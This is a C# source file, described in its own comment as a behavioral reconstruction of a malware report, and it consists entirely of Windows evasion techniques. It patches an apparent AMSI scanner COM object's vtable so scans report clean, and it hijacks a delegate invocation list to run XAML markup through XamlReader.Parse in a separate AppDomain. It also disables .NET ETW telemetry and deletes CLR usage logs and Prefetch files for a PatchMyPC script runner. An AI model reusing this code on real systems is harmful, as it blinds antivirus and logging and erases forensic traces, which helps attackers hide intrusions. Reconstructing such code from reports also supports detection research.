using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Markup;

// Behavioral reconstruction of the report, not the original recovered assembly.
public static class ManagedTechniques {
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr address, UIntPtr size, uint protection, out uint old);

    public static void PatchScanner() {
        if (IntPtr.Size != 8) return;
        object scanner = Activator.CreateInstance(Type.GetTypeFromCLSID(new Guid("fdb00e52-a214-4aa1-8fba-4357bb0072ec")));
        Action replacement = Console.Clear;
        IntPtr target = replacement.Method.MethodHandle.GetFunctionPointer();
        byte[] clean = { 0x41, 0xc7, 0x00, 0x01, 0x00, 0x00, 0x00, 0x33, 0xc0, 0xc3 };
        uint previous;
        VirtualProtect(target, (UIntPtr)clean.Length, 0x40, out previous);
        Marshal.Copy(clean, 0, target, clean.Length);
        uint ignored;
        VirtualProtect(target, (UIntPtr)clean.Length, previous, out ignored);
        IntPtr instance = Marshal.GetIUnknownForObject(scanner);
        IntPtr table = Marshal.ReadIntPtr(instance);
        IntPtr slot = IntPtr.Add(table, 0x18);
        VirtualProtect(slot, (UIntPtr)IntPtr.Size, 0x04, out previous);
        Marshal.WriteIntPtr(slot, target);
        VirtualProtect(slot, (UIntPtr)IntPtr.Size, previous, out ignored);
        Marshal.Release(instance);
    }

    public static void ExecuteInDomain(string markup) {
        AppDomain isolated = AppDomain.CreateDomain(Guid.NewGuid().ToString());
        CrossAppDomainDelegate callback = TimeZoneInfo.ClearCachedData;
        callback += TimeZoneInfo.ClearCachedData;
        Delegate parse = Delegate.CreateDelegate(typeof(Func<string, object>), typeof(XamlReader).GetMethod("Parse", new[] { typeof(string) }));
        FieldInfo field = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.Instance | BindingFlags.NonPublic);
        object[] invocation = (object[])field.GetValue(callback);
        invocation[1] = parse;
        field.SetValue(callback, invocation);
        isolated.SetData("markup", markup);
        isolated.DoCallBack(callback);
        AppDomain.Unload(isolated);
    }

    public static void RemoveTraces() {
        File.Delete(Environment.ExpandEnvironmentVariables(@"%LOCALAPPDATA%\Microsoft\CLR_v4.0\UsageLogs\PatchMyPC-ScriptRunner.exe.log"));
        string folder = Environment.ExpandEnvironmentVariables(@"%WINDIR%\Prefetch");
        foreach (string trace in Directory.GetFiles(folder, "PATCHMYPC-SCRIPTRUNNER.EXE-*.pf")) File.Delete(trace);
    }

    public static void PrepareHost() {
        Environment.SetEnvironmentVariable("COMPlus_ETWEnabled", "0");
    }
}
